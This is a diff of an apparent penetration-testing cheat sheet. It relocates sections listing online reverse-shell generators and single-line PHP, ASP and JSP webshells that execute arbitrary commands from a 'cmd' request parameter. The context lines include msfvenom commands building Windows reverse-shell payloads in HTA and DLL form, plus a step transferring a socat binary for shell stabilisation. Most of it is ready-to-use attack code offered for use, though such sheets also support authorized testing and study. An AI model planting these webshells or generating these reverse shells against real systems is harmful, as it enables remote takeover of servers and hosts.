@@ -49,6 +49,27 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 ```
 
+## Online Generator
+<https://www.revshells.com/>
+
+<https://weibell.github.io/reverse-shell-generator/>
+
+## Single line Webshell
+
+#### PHP
+```
+<?php echo passthru($_GET['cmd']); ?>
+<?php echo shell_exec($_GET['cmd']); ?>
+```
+#### ASP
+```
+<% eval request("cmd") %>
+```
+#### JSP
+```
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
 ## Shell Stabilisation
 
 #### Technique 01: Python
@@ -109,27 +130,4 @@ Restricted to Linux target
 ```
 ➤ Step 01: Transfer a socat static compiled binary (e.g., using python http.server)
 ➤ Step 02: Use Socat
-```
-
-#### Online Generator
-<https://www.revshells.com/>
-
-<https://weibell.github.io/reverse-shell-generator/>
-
-
-
-## Single line Webshell
-
-#### PHP
-```
-<?php echo passthru($_GET['cmd']); ?>
-<?php echo shell_exec($_GET['cmd']); ?>
-```
-#### ASP
-```
-<% eval request("cmd") %>
-```
-#### JSP
-```
-<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
